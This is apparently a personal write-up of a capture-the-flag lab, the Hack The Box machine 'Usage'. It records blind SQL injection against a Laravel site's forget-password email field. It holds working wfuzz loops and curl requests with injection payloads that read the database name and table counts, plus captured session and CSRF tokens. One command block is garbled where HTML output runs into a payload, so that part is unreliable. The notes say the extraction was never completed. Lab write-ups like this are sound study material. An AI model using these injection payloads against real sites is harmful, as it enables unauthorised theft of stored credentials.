# Usage \[Easy]

## Report

A PHP Laravel site is prone to blind SQLi in the 'Forgot Password' page at the 'email' parameter.  The admin/user creds are exposed which we did not achieve due to inability to follow redirects via curl and hence decided ffuf also would not either.

Intruder did but it was too slow to make any noticable progress

{% embed url="https://0xdf.gitlab.io/2024/10/19/htb-editorial.html" %}

## Cheatsheet

```
laravel php
admin.usage.htb vhost
token field whenever login is being performed
fuzzing forget-password
[Status: 301, Size: 178, Words: 6, Lines: 8

for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+";done 

for i in $(seq 1 10); wfuzz -c -z range,32-127  -b "XSRF-TOKEN=eyJpdiI6ImJDMDhuWEdORUhxYVo3ZE9tSHhUM3c9PSIsInZhbHVlIjoiMHVxc3FqLzcvcFBQcExFWXhRN0Z4YTE4aHp1VnJnTEtXOTZWWGZYbjBWRUJBWUc0VjhJSHh6RThYNWZDYUtPY0RVYXJRVlpBU09SV1laY0M0eWtPMUZBdFJ1Qk1DZDRheFUySUtHVC9BOXNNbmlCWTVZNGZLVzhIZ1pBbXpoYmMiLCJtYWMiOiJjYTIyY2I2OTM4YTI2MTNkODlhZmJkOWIxMzljMjA2ZmFkMmUyNGMwMGQ5MThjYWU0M2FiMGY4MWI0ZjEyNmVjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjE3cGI3bjR5Y3psMkUvUWJ0TGw5V2c9PSIsInZhbHVlIjoiZi9xY3NuR3ErVXVWMzlFcXROVGZxQkNTRERJMHB0bGNZZ0UxcVFZZGIycktmWFRaZWIrNmJKcy9RZEhqOEtpVmFFb1piWXB4MVMrS01nN2swR2ZDK3pZQjdMR1VEY0p5a3c1SW9rOXJFcTdzbDdNTm54RnoyOGM0U1kyZ2xHaWkiLCJtYWMiOiIyZTQxNmYyZTc3OWU3NjlhMzE1ZjgyOGJkZDg3M2FiYzFkOWM1ODljNTQxODhhZTNhZTk0MzRhMDU0OTg4MDcwIiwidGFnIjoiIn0%3D" -u http://10.10.11.18/forget-password:80 -X POST -d "_token=C9PYLY5AYByiQPK35kxcSJb4rYu9VLJulIGOe1RH&email=x OR (ascii(substr(database(),$i,1)))=FUZZ-- -'" --hw=12



Once we broke the sql identify the or code that actlly makes it work properly

curl --insecure -b "XSRF-TOKEN=eyJpdiI6ImJDMDhuWEdORUhxYVo3ZE9tSHhUM3c9PSIsInZhbHVlIjoiMHVxc3FqLzcvcFBQcExFWXhRN0Z4YTE4aHp1VnJnTEtXOTZWWGZYbjBWRUJBWUc0VjhJSHh6RThYNWZDYUtPY0RVYXJRVlpBU09SV1laY0M0eWtPMUZBdFJ1Qk1DZDRheFUySUtHVC9BOXNNbmlCWTVZNGZLVzhIZ1pBbXpoYmMiLCJtYWMiOiJjYTIyY2I2OTM4YTI2MTNkODlhZmJkOWIxMzljMjA2ZmFkMmUyNGMwMGQ5MThjYWU0M2FiMGY4MWI0ZjEyNmVjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjE3cGI3bjR5Y3psMkUvUWJ0TGw5V2c9PSIsInZhbHVlIjoiZi9xY3NuR3ErVXVWMzlFcXROVGZxQkNTRERJMHB0bGNZZ0UxcVFZZGIycktmWFRaZWIrNmJKcy9RZEhqOEtpVmFFb1piWXB4MVMrS01nN2swR2ZDK3pZQjdMR1VEY0p5a3c1SW9rOXJFcTdzbDdNTm54RnoyOGM0U1kyZ2xHaWkiLCJtYWMiOiIyZTQxNmYyZTc3OWU3NjlhMzE1ZjgyOGJkZDg3M2FiYzFkOWM1ODljNTQxODhhZTNhZTk0MzRhMDU0OTg4MDcwIiwidGFnIjoiIn0%3D" -X POST --data "_token=C9PYLY5AYByiQPK35kxcSJb4rYu9VLJulIGOe1RH&email=j@gmail.com' or 1=1;-- -';" http://usage.htb/forget-password

IF email does not exist
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://usage.htb/forget-password'" />itle>Redirecting to http://usage.htb/forget-password</title>6l.com' or (select count(*) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='usage_blog')=15;-- -';TOKEN=eyJpdiI6ImJDMDhuWEdORUhxYVo3ZE9tSHhUM3c9PSIsInZhbHVlIjoiMHVxc3FqLzcvcFBQcExFWXhRN0Z4YTE4aHp1VnJnTEtXOTZWWGZYbjBWRUJBWUc0VjhJSHh6RThYNWZDYUtPY0RVYXJRVlpBU09SV1laY0M0eWtPMUZBdFJ1Qk1DZDRheFUySUtHVC9BOXNNbmlCWTVZNGZLVzhIZ1pBbXpoYmMiLCJtYWMiOiJjYTIyY2I2OTM4YTI2MTNkODlhZmJkOWIxMzljMjA2ZmFkMmUyNGMwMGQ5MThjYWU0M2FiMGY4MWI0ZjEyNmVjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjE3cGI3bjR5Y3psMkUvUWJ0TGw5V2c9PSIsInZhbHVlIjoiZi9xY3NuR3ErVXVWMzlFcXROVGZxQkNTRERJMHB0bGNZZ0UxcVFZZGIycktmWFRaZWIrNmJKcy9RZEhqOEtpVmFFb1piWXB4MVMrS01nN2swR2ZDK3pZQjdMR1VEY0p5a3c1SW9rOXJFcTdzbDdNTm54RnoyOGM0U1kyZ2xHaWkiLCJtYWMiOiIyZTQxNmYyZTc3OWU3NjlhMzE1ZjgyOGJkZDg3M2FiYzFkOWM1ODljNTQxODhhZTNhZTk0MzRhMDU0OTg4MDcwIiwidGFnIjoiIn0%3D" -X POST --data "_token=C9PYLY5AYByiQPK35kxcSJb4rYu9VLJulIGOe1RH&email=j@gmail.com" http://usage.htb/forget-password

```

## Loot

curl sort page xpired - refresh session, token cookies

ffuf does work if curl sorted then peace

Well i couldnt sort the curl bit but burp intruder can follow redirecta however its really slow and if other machines are involved then ofc we can focus on them while this goes on.

Can turbo intruder follow redirects tho?

{% embed url="https://stackoverflow.com/questions/18474690/is-there-a-way-to-follow-redirects-with-command-line-curl" %}

using raw request incase missing headers were the problem

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
